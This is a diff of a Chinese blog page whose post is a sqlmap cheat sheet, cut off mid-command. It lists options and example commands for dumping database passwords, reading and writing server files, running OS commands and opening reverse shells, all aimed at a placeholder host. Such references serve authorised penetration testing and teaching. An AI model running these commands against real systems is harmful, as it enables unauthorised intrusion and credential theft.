@@ -1,448 +1,848 @@
 <!DOCTYPE html>
-<html lang=en>
+<html lang="en">
 <head>
-    <!-- so meta -->
     <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="sqlmap 常用指令SQLMap 是一款自动化的SQL注入测试工具，在 kali 上已集成 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081">
-<meta property="og:type" content="article">
-<meta property="og:title" content="sqlmap 常用指令">
-<meta property="og:url" content="https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/index.html">
-<meta property="og:site_name" content="iah&#39;s blog">
-<meta property="og:description" content="sqlmap 常用指令SQLMap 是一款自动化的SQL注入测试工具，在 kali 上已集成 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081">
-<meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-08-07T07:59:49.000Z">
-<meta property="article:modified_time" content="2023-08-07T08:01:07.023Z">
-<meta property="article:author" content="iahzl">
-<meta property="article:tag" content="sql注入">
-<meta property="article:tag" content="sqlmap">
-<meta name="twitter:card" content="summary">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="S3a">
     
-    
-      
+    <title>
         
-          <link rel="shortcut icon" href="/images/favicon.ico">
+            sqlmap 常用指令 |
         
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>sqlmap 常用指令</title>
-    <!-- async scripts -->
-    <!-- Google Analytics -->
-
-  <script async src="https://www.googletagmanager.com/gtag/js?id=pjwW3MzIwiIEl1lYN-ZEbHa4nwnoXvXY4O3b-Awgio"></script>
-  <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
-      gtag('config', 'pjwW3MzIwiIEl1lYN-ZEbHa4nwnoXvXY4O3b-Awgio');
-  </script>
-
-
-    <!-- Umami Analytics -->
-
-
-    <!-- styles -->
+        S3a&#39;s blog
+    </title>
     
 <link rel="stylesheet" href="/css/style.css">
 
-    <!-- persian styles -->
     
-    <!-- rss -->
+        <link rel="shortcut icon" href="/images/logo.svg">
     
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/font/css/brands.min.css">
     
-	<!-- mathjax -->
-	
-<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="iah's blog" type="application/atom+xml">
+        
+            
+        
+            
+                
+<link rel="stylesheet" href="/css/custom.css">
+
+            
+        
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"iahzl.github.io","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"S3a's blog","author":"S3a","avatar":"/images/avatar.svg","logo":"/images/logo.svg","favicon":"/images/logo.svg"},"menu":{"Home":"/","Archives":"/archives","Categories":"/categories","Links":"/links","About":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"素履之往,独行愿也.","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/iahzl","weixin":null,"qq":"http://wpa.qq.com/msgrd?v=3&uin=3290188431&site=qq&menu=yes","weibo":null,"zhihu":null,"twitter":null,"facebook":null,"email":"mailto:3290188431@qq.com"}},"scroll":{"progress_bar":true,"percent":true,"hide_header":true},"home":{"category":true,"tag":false,"announcement":"欢迎来到S3a's blog!"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":true,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"7k3CLk60MtrFMwCeGukb3GQJ-gzGzoHsz","appkey":"qVXoRTYc2mDgd8leYtgZAeq2","server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"feed":{"type":"atom","path":"atom.xml","limit":20},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"jsdelivr"},"pjax":{"enable":true},"footer":{"since":2023,"word_count":true,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":true,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":true,"css":[null,"/css/custom.css"],"js":[null,"/js/time.js"]},"links":[{"title":"欢迎添加友链"},{"name":"S3a","link":"https://iahzl.github.io/","description":"素履之往,独行愿也.","avatar":"https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/ico.png"},"......"],"version":"4.0.0"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original article title","author":"Original article author","link":"Original article link"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="S3a's blog" type="application/atom+xml">
 </head>
 
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">Home</a></li><!--
-     --><!--
-       --><li><a href="/categories/">Categories</a></li><!--
-     --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
-     --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
-     --><!--
-       --><li><a target="_blank" rel="noopener" href="http://github.com/iahzl">Projects</a></li><!--
-     --><!--
-       --><li><a href="/search/">Search</a></li><!--
-     --><!--
-       --><li><a href="/about/">About</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="Previous post" href="/Python-Homework-Checker/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="Next post" href="/%E4%BE%8B%E9%A2%98-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/&text=sqlmap 常用指令"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/&title=sqlmap 常用指令"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/&is_video=false&description=sqlmap 常用指令"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=sqlmap 常用指令&body=Check out this article: https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/&title=sqlmap 常用指令"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/&title=sqlmap 常用指令"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/&title=sqlmap 常用指令"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/&title=sqlmap 常用指令"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/&name=sqlmap 常用指令&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://iahzl.github.io/sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/&t=sqlmap 常用指令"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
 
-    </div>
+<body>
+<div class="progress-bar-container">
     
+        <span class="scroll-progress-bar"></span>
     
-      <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">sqlmap 常用指令</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap-%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E8%84%9A%E6%9C%AC"><span class="toc-number">2.</span> <span class="toc-text">sqlmap 常用绕过脚本</span></a></li></ol>
-      </div>
+
     
-  </span>
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
 </div>
 
+
+<main class="page-container border-box">
+
+    <!-- home first screen  -->
     
-    <div class="content index py4 ">
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/about/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               S3a&#39;s blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                LINKS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">LINKS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+
+        <div class="article-content-container border-box">
+
+            
+
+            <div class="article-content-bottom border-box">
+                
+                    <div class="article-title">
+                        sqlmap 常用指令
+                    </div>
+                
+
+                
+                    <div class="article-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/avatar.svg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author">
+                                <span class="name">S3a</span>
+                                
+                                    <span class="author-badge">Lv3</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="article-meta-info-container border-box post">
+    <div class="article-meta-info border-box">
         
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
+
+
+        
+            <span class="meta-info-item article-create-date">
+                <i class="icon fa-solid fa-calendar-check"></i>&nbsp;
+                <span class="pc">2023-08-07 15:59:49</span>
+                <span class="mobile">2023-08-07 15:59</span>
+            </span>
+
+            <span class="meta-info-item article-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="pc" data-updated="Mon Aug 07 2023 16:01:07 GMT+0800">2023-08-07 16:01:07</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item article-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="article-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/Web/">Web</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="article-tag meta-info-item border-box">
+                <i class="icon fas fa-tags"></i>&nbsp;
+                <ul class="article-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/sqlmap/">sqlmap</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item article-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>2.5k Words</span>
+            </span>
+        
+        
+            <span class="meta-info-item article-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>11 Mins</span>
+            </span>
+        
+        
+            <span class="meta-info-item article-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
     
-    <h1 class="posttitle p-name" itemprop="name headline">
-        sqlmap 常用指令
-    </h1>
+</div>
 
+                            </div>
+                        </div>
+                    </div>
+                
 
+                <div class="article-content keep-markdown-body">
+                    
 
-    <div class="meta">
-      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">iahzl</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2023-08-07T07:59:49.000Z" class="dt-published" itemprop="datePublished">2023-08-07</time>
-        
-      
-    </div>
-
-
-      
-    <div class="article-category">
-        <i class="fa-solid fa-archive"></i>
-        <a class="category-link" href="/categories/Web/">Web</a>
-    </div>
-
-
-      
-    <div class="article-tag">
-        <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/sqlmap/" rel="tag">sqlmap</a>, <a class="p-category" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a>
-    </div>
-
-
-    </div>
-  </header>
-  
-
-  <div class="content e-content" itemprop="articleBody">
-    <h1 id="sqlmap-常用指令"><a href="#sqlmap-常用指令" class="headerlink" title="sqlmap 常用指令"></a>sqlmap 常用指令</h1><p>SQLMap 是一款自动化的SQL注入测试工具，在 kali 上已集成</p>
+                    <h1 id="sqlmap-常用指令"><a href="#sqlmap-常用指令" class="headerlink" title="sqlmap 常用指令"></a>sqlmap 常用指令</h1><p>SQLMap 是一款自动化的SQL注入测试工具，在 kali 上已集成</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">基本操作笔记：-u  <span class="comment">#注入点 </span></span><br><span class="line">-f  <span class="comment">#指纹判别数据库类型 </span></span><br><span class="line">-b  <span class="comment">#获取数据库版本信息 </span></span><br><span class="line">-p  <span class="comment">#指定可测试的参数(?page=1&amp;id=2 -p &quot;page,id&quot;) </span></span><br><span class="line">-D <span class="string">&quot;&quot;</span>  <span class="comment">#指定数据库名 </span></span><br><span class="line">-T <span class="string">&quot;&quot;</span>  <span class="comment">#指定表名 </span></span><br><span class="line">-C <span class="string">&quot;&quot;</span>  <span class="comment">#指定字段 </span></span><br><span class="line">-s <span class="string">&quot;&quot;</span>  <span class="comment">#保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s &quot;xx.log&quot;　　恢复:-s &quot;xx.log&quot; --resume) </span></span><br><span class="line">--level=(1-5) <span class="comment">#要执行的测试水平等级，默认为1 </span></span><br><span class="line">	--level1：默认的等级，会进行基本的测试，包括GET和POST方式。</span><br><span class="line">	--level2: 在原有的基础上增加对cookie的检测。 </span><br><span class="line">	--level3: 增加对User Agent、Referer 的检测 </span><br><span class="line">	--lever4: 更多的payload </span><br><span class="line">	--level5: 最高等级，包含所有的payload,会尝试自动破解出cookie、xff等头部注入。</span><br><span class="line">	</span><br><span class="line">--risk=(0-3)  <span class="comment">#测试执行的风险等级，默认为1 </span></span><br><span class="line">--time-sec=(2,5) <span class="comment">#延迟响应，默认为5 </span></span><br><span class="line">--data <span class="comment">#通过POST发送数据 </span></span><br><span class="line">--columns        <span class="comment">#列出字段 </span></span><br><span class="line">--current-user   <span class="comment">#获取当前用户名称 </span></span><br><span class="line">--current-db     <span class="comment">#获取当前数据库名称 </span></span><br><span class="line">--<span class="built_in">users</span>          <span class="comment">#列数据库所有用户 </span></span><br><span class="line">--passwords      <span class="comment">#数据库用户所有密码 </span></span><br><span class="line">--privileges     <span class="comment">#查看用户权限(--privileges -U root) </span></span><br><span class="line">-U               <span class="comment">#指定数据库用户 </span></span><br><span class="line">--dbs            <span class="comment">#列出所有数据库 </span></span><br><span class="line">--tables -D <span class="string">&quot;&quot;</span>   <span class="comment">#列出指定数据库中的表 </span></span><br><span class="line">--columns -T <span class="string">&quot;user&quot;</span> -D <span class="string">&quot;mysql&quot;</span>      <span class="comment">#列出mysql数据库中的user表的所有字段 </span></span><br><span class="line">--dump-all            <span class="comment">#列出所有数据库所有表 </span></span><br><span class="line">--exclude-sysdbs      <span class="comment">#只列出用户自己新建的数据库和表 </span></span><br><span class="line">--dump -T <span class="string">&quot;&quot;</span> -D <span class="string">&quot;&quot;</span> -C <span class="string">&quot;&quot;</span>   <span class="comment">#列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) </span></span><br><span class="line">--dump -T <span class="string">&quot;&quot;</span> -D <span class="string">&quot;&quot;</span> --start 2 --top 4  <span class="comment"># 列出指定数据库的表的2-4字段的数据 </span></span><br><span class="line">--dbms    <span class="comment">#指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </span></span><br><span class="line">--os      <span class="comment">#指定系统(Linux,Windows) </span></span><br><span class="line">-v  <span class="comment">#详细的等级(0-6) </span></span><br><span class="line">    0：只显示Python的回溯，错误和关键消息。 </span><br><span class="line">    1：显示信息和警告消息。 </span><br><span class="line">    2：显示调试消息。 </span><br><span class="line">    3：有效载荷注入。 </span><br><span class="line">    4：显示HTTP请求。 </span><br><span class="line">    5：显示HTTP响应头。 </span><br><span class="line">    6：显示HTTP响应页面的内容 </span><br><span class="line">--privileges  <span class="comment">#查看权限 </span></span><br><span class="line">--is-dba      <span class="comment">#是否是数据库管理员 </span></span><br><span class="line">--roles       <span class="comment">#枚举数据库用户角色 </span></span><br><span class="line">--udf-inject  <span class="comment">#导入用户自定义函数（获取系统权限） </span></span><br><span class="line">--union-check  <span class="comment">#是否支持union 注入 </span></span><br><span class="line">--union-cols <span class="comment">#union 查询表记录 </span></span><br><span class="line">--union-test <span class="comment">#union 语句测试 </span></span><br><span class="line">--union-use  <span class="comment">#采用union 注入 </span></span><br><span class="line">--union-tech orderby <span class="comment">#union配合order by </span></span><br><span class="line">--data <span class="string">&quot;&quot;</span> <span class="comment">#POST方式提交数据(--data &quot;page=1&amp;id=2&quot;) </span></span><br><span class="line">--cookie <span class="string">&quot;用;号分开&quot;</span>      <span class="comment">#cookie注入(--cookies=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot;) </span></span><br><span class="line">--referer <span class="string">&quot;&quot;</span>     <span class="comment">#使用referer欺骗(--referer &quot;http://www.baidu.com&quot;) </span></span><br><span class="line">--user-agent <span class="string">&quot;&quot;</span>  <span class="comment">#自定义user-agent </span></span><br><span class="line">--proxy <span class="string">&quot;http://127.0.0.1:8118&quot;</span> <span class="comment">#代理注入 </span></span><br><span class="line">--string=<span class="string">&quot;&quot;</span>    <span class="comment">#指定关键词,字符串匹配. </span></span><br><span class="line">--threads 　　  <span class="comment">#采用多线程(--threads 3) </span></span><br><span class="line">--sql-shell    <span class="comment">#执行指定sql命令 </span></span><br><span class="line">--sql-query    <span class="comment">#执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) </span></span><br><span class="line">--file-read    <span class="comment">#读取指定文件 </span></span><br><span class="line">--file-write   <span class="comment">#写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) </span></span><br><span class="line">--file-dest    <span class="comment">#要写入的文件绝对路径 </span></span><br><span class="line">--os-cmd=<span class="built_in">id</span>    <span class="comment">#执行系统命令 </span></span><br><span class="line">--os-shell     <span class="comment">#系统交互shell </span></span><br><span class="line">--os-pwn       <span class="comment">#反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) </span></span><br><span class="line">--msf-path=    <span class="comment">#matesploit绝对路径(--msf-path=/opt/framework/msf3/) </span></span><br><span class="line">--os-smbrelay  <span class="comment"># </span></span><br><span class="line">--os-bof       <span class="comment"># </span></span><br><span class="line">--reg-read     <span class="comment">#读取win系统注册表 </span></span><br><span class="line">--priv-esc     <span class="comment"># </span></span><br><span class="line">--time-sec=    <span class="comment">#延迟设置 默认--time-sec=5 为5秒 </span></span><br><span class="line">-p <span class="string">&quot;user-agent&quot;</span> --user-agent <span class="string">&quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;</span>  <span class="comment">#指定user-agent注入 </span></span><br><span class="line">--eta          <span class="comment">#盲注 </span></span><br><span class="line">/pentest/database/sqlmap/txt/</span><br><span class="line">common-columns.txt　　字段字典　　　 </span><br><span class="line">common-outputs.txt </span><br><span class="line">common-tables.txt      表字典 </span><br><span class="line">keywords.txt </span><br><span class="line">oracle-default-passwords.txt </span><br><span class="line">user-agents.txt </span><br><span class="line">wordlist.txt </span><br><span class="line"></span><br><span class="line">常用语句 :</span><br><span class="line">1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --<span class="built_in">users</span> --passwords --dbs -v 0 </span><br><span class="line">2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 </span><br><span class="line">3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T <span class="built_in">users</span> -C username -D userdb --start 2 --stop 3 -v 2 </span><br><span class="line">4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C <span class="string">&quot;user,pass&quot;</span>  -v 1 --exclude-sysdbs </span><br><span class="line">5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 </span><br><span class="line">6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read <span class="string">&quot;c:\boot.ini&quot;</span> -v 2 </span><br><span class="line">7./sqlmap.py -u 